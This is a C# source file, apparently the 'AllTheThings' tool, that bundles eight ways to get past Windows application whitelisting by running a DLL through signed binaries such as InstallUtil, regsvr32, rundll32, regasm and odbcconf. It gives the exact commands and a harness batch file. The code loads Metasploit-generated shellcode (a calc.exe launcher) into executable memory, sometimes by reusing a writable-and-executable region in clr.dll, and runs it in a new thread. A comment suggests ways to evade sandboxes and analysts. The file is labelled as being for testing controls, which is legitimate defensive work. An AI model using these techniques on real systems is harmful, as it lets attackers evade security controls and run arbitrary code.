using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.EnterpriseServices;
using System.IO; // ConsoleHelper


// xref: https://blog.xpnsec.com/the-net-export-portal/

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

For Testing Binary Application Whitelisting Controls

Includes 7 Known Application Whitelisting/ Application Control Bypass Techniques in One File.
1. InstallUtil.exe
2. Regsvcs.exe
3. Regasm.exe
4. regsvr32.exe
5. rundll32.exe
6. odbcconf.exe
7. regsvr32 with params
8. InstallUtil.exe /? AllTheThings.DllImport


Usage:
1.
    x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
2.
    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
3.
    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

4.
    regsvr32 /s /u AllTheThings.dll -->Calls DllUnregisterServer
    regsvr32 /s AllTheThings.dll --> Calls DllRegisterServer
5.
    rundll32 AllTheThings.dll,EntryPoint

6.
    odbcconf.exe /s /a { REGSVR AllTheThings.dll }

7.
    regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThings.dll
8.
	x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? AllTheThings.dll
    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /? AllTheThings.dll


Sample Harness.Bat

[Begin]
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
regsvr32 /s /u AllTheThings.dll
regsvr32 /s AllTheThings.dll
rundll32 AllTheThings.dll,EntryPoint
odbcconf.exe /a { REGSVR AllTheThings.dll }
regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThings.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? AllTheThings.dll

[End]


*/





[assembly: ApplicationActivation(ActivationOption.Server)]
[assembly: ApplicationAccessControl(false)]

public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        //Add any behaviour here to throw off sandbox execution/analysts :)
    }

}

public class Thing0
{

    public static void ExecParam(string a)
    {
		Process p = Process.Start("cmd.exe");
		SetWindowText(p.MainWindowHandle, a);
    }
	
	[DllImport("user32.dll")]
	static extern int SetWindowText(IntPtr hWnd, string text);

}

[System.ComponentModel.RunInstaller(true)]
public class Things : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {

        Console.WriteLine("Hello There From Uninstall");
		Thing0.ExecParam("InstallUtil Uninstall");


    }
	
	public override string HelpText {
		get {
				Thing0.ExecParam("InstallUtil Uninstall");
				return "Executed: HelpText property\n";
			}
		
	   }
}


[ComVisible(true)]
[Guid("31D2B969-7608-426E-9D8E-A09FC9A51680")]
[ClassInterface(ClassInterfaceType.None)]
[ProgId("dllguest.Bypass")]
[Transaction(TransactionOption.Required)]
public class Bypass : ServicedComponent
{
    public Bypass() { Console.WriteLine("I am a basic COM Object"); }

    [ComRegisterFunction] //This executes if registration is successful
    public static void RegisterClass(string key)
    {
        Console.WriteLine("I shouldn't really execute");
        Thing0.ExecParam("COM UnRegisterClass");
    }

    [ComUnregisterFunction] //This executes if registration fails
    public static void UnRegisterClass(string key)
    {
        Console.WriteLine("I shouldn't really execute either.");
        Thing0.ExecParam("COM UnRegisterClass");
    }

    public void Exec() { Thing0.ExecParam("COM Public Exec"); }
}



class Exports
{
	[DllImport("kernel32")]
    public static extern bool AllocConsole();
    //
    //
    //rundll32 entry point
    public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
    {
		AllocConsole();
		
		Console.WriteLine("Hello There From EntryPoint");
		uint a = Shellcode.Hunt();
		Console.WriteLine(a.ToString("X4"));
		Console.ReadLine();
		if(a>0)
		{
			Console.WriteLine("Found Space\n");
			Shellcode.Exec (a);
		}
		else
		{
			Console.WriteLine("Created Space");
			Shellcode.Exec();
		}
		
    }

    public static bool DllRegisterServer()
    {
        Thing0.ExecParam("DllRegisterServer"); 
        return true;
    }

    public static bool DllUnregisterServer()
    {
        Thing0.ExecParam("DllUnregisterServer"); 
        return true;
    }

    public static void DllInstall(bool bInstall, IntPtr a)
    {
        string b = Marshal.PtrToStringUni(a);
        Thing0.ExecParam(b);
    }


}

public class Shellcode
{
		
		public static UInt32 Hunt()
		{
			
			
			long address = (long)LoadLibrary(@"C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll");
			long MaxAddress = address+0xffffff; //TODO: Do this dynamically later
			Console.WriteLine("clr at {0}",address.ToString("x4"));
			do
			{
				
				 MEMORY_BASIC_INFORMATION m;
				 
				 int result = VirtualQueryEx(System.Diagnostics.Process.GetCurrentProcess().Handle, (IntPtr)address, out m, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
				 Console.Write("{0}\n",m.BaseAddress.ToString("X4"));
				 if(m.Protect == (uint)AllocationProtect.PAGE_EXECUTE_READWRITE && ( m.Type == 0x1000000 ) ) //0x1000000 == MEM_IMAGE
				 {
					 //Console.Write("{0}\n",m.BaseAddress.ToString("X4"));
					 return (UInt32)m.BaseAddress;
				 }
				 //if (address == (long)m.BaseAddress + (long)m.RegionSize)
				 //break;
				 address = (long)m.BaseAddress + (long)m.RegionSize;
			} while (address <= MaxAddress);
			
			return 0;
		}
		
		
		
		public static void Exec()
		{
			// native function's compiled code
			// generated with metasploit
			byte[] shellcode = new byte[193] {
		0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
		0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
		0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
		0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
		0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
		0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
		0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
		0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
		0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
		0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
		0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
		0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
		0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };


 
			UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
								MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
			IntPtr hThread = IntPtr.Zero;
			UInt32 threadId = 0;
			// prepare data
 
 
			IntPtr pinfo = IntPtr.Zero;
 
			// execute native code
 
			hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
			WaitForSingleObject(hThread, 0xFFFFFFFF);
			return;
			
	  }
	  
	  public static void Exec(UInt32 address)
		{
			// native function's compiled code
			// generated with metasploit
			byte[] shellcode = new byte[193] {
		0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
		0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
		0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
		0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
		0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
		0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
		0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
		0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
		0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
		0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
		0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
		0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
		0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };


 
			UInt32 funcAddr = address;
			Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
			IntPtr hThread = IntPtr.Zero;
			UInt32 threadId = 0;
			// prepare data
 
 
			IntPtr pinfo = IntPtr.Zero;
 
			// execute native code
 
			hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
			WaitForSingleObject(hThread, 0xFFFFFFFF);
			return;
			
	  }
 
		private static UInt32 MEM_COMMIT = 0x1000;
 
		private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

		[DllImport("kernel32")]
		private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

	

	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(

	  UInt32 lpThreadAttributes,
	  UInt32 dwStackSize,
	  UInt32 lpStartAddress,
	  IntPtr param,
	  UInt32 dwCreationFlags,
	  ref UInt32 lpThreadId

	  );
	[DllImport("kernel32")]
	private static extern bool CloseHandle(IntPtr handle);

	[DllImport("kernel32")]
	private static extern UInt32 WaitForSingleObject(

	  IntPtr hHandle,
	  UInt32 dwMilliseconds
	  );
	
	[DllImport("kernel32.dll")]
    private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);
	
	[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
	private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
	
	//MEMORY_BASIC_INFORMATION

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
    public IntPtr BaseAddress;
    public IntPtr AllocationBase;
    public uint AllocationProtect;
    public IntPtr RegionSize;
    public uint State;
    public uint Protect;
    public uint Type;
    }
	
	public enum AllocationProtect : uint
    {
    PAGE_EXECUTE = 0x00000010,
    PAGE_EXECUTE_READ = 0x00000020,
    PAGE_EXECUTE_READWRITE = 0x00000040,
    PAGE_EXECUTE_WRITECOPY = 0x00000080,
    PAGE_NOACCESS = 0x00000001,
    PAGE_READONLY = 0x00000002,
    PAGE_READWRITE = 0x00000004,
    PAGE_WRITECOPY = 0x00000008,
    PAGE_GUARD = 0x00000100,
    PAGE_NOCACHE = 0x00000200,
    PAGE_WRITECOMBINE = 0x00000400
    }	
 
}
